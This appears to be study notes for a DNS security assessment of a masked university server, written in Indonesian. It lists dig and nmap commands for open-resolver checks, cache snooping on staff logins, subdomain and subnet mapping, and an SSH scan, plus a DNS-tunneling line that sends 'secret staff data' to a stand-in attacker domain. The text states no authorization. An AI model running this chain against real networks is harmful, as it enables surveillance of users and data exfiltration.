### DNS Security Assessment: From Misconfiguration to Information Disclosure
###### Target: 128.***.***.*[sesuaikan]
###### Date: March 17, 2026
---

**1. Phase: Verification of Open Resolver (Vulnerability)**
Tahap awal untuk memastikan server mau melayani permintaan dari publik.

```Bash
# Mengecek apakah rekursi diizinkan untuk domain publik
dig @128.***.***.*[sesuaikan] google.com ANY

# Mengecek apakah server gagal melakukan validasi DNSSEC
# Jika hasilnya NOERROR (bukan SERVFAIL), maka server rentan DNS Spoofing
dig @128.***.***.*[sesuaikan] dnssec-failed.org ANY
```

**2. Phase: Information Disclosure (Cache Snooping)**
Tahap untuk membuktikan bahwa kita bisa mengintip aktivitas pengguna internal melalui data yang tersimpan di cache DNS.

```Bash
# Teknik manual: Menggunakan flag +norecurse
# Jika ada jawaban (Answer Section), berarti user internal baru saja mengakses domain tersebut
dig @128.***.***.*[sesuaikan] outlook.office365.com +norecurse
dig @128.***.***.*[sesuaikan] login.microsoftonline.com +norecurse

# Teknik otomatis: Menggunakan Nmap NSE
nmap -sU -p 53 --script dns-cache-snoop 128.***.***.*[sesuaikan]
```

**3. Phase: Internal Infrastructure Mapping (Reconnaissance)**
Tahap memetakan aset internal universitas melalui kebocoran data di server DNS.

```Bash
# Mencari subdomain internal secara otomatis
nmap -sU -p 53 --script dns-brute 128.***.***.*[sesuaikan]

# Reverse DNS Lookup: Memetakan seluruh nama host dalam satu subnet /24
nmap -sL --dns-servers 128.***.***.*[sesuaikan] 128.***.***.*[sesuaikan].0/24
```

**4. Phase: Data Exfiltration Path (DNS Tunneling)**
Membuktikan bahwa server bisa digunakan sebagai jalur keluar data rahasia tanpa melewati firewall biasa.

```Bash
# Mengirimkan data sebagai subdomain ke server DNS eksternal milik penyerang
dig @128.***.***.*[sesuaikan] v1-data-rahasia-staf-utexas.yourdomain.com
```

**5. Phase: Targeted Service Identification (Attack Chaining)**
Menggunakan informasi dari DNS untuk menemukan layanan kritis di host internal yang terekspos.

```Bash
# Melakukan scan versi pada port SSH yang ditemukan dari hasil DNS leak
nmap -sV -p 22 128.***.***.*[sesuaikan]
```

***📝Catatan Penting untuk Dipelajari:***
+ Status RA (Recursion Available): Jika bendera ra muncul di hasil dig, itu konfirmasi pertama bahwa server adalah Open Resolver.
+ Status NOERROR pada dnssec-failed: Ini adalah bukti Integrity Violation. Server tidak memverifikasi tanda tangan digital paket DNS.
+ Shadow IT Identification: Temuan Unbound pada host departemen (ccbb) yang merujuk ke Infoblox milik pusat (ITS) menunjukkan adanya ketidaksinkronan kebijakan keamanan (Shadow IT).
+ `qr` (Query Response): Menunjukkan ini adalah balasan dari server.
+ `rd` (Recursion Desired): Kamu meminta server untuk mencarikan data (dari sisi client).
+ `ra` (Recursion Available): INI KUNCINYA. Jika muncul di jawaban server, berarti server tersebut mengizinkan rekursi bagi publik.
+ `ad` (Authenticated Data): Jika muncul, berarti DNSSEC aktif. (Pada tes kamu ke dnssec-failed.org, flag ini absen, yang membuktikan kerentanan).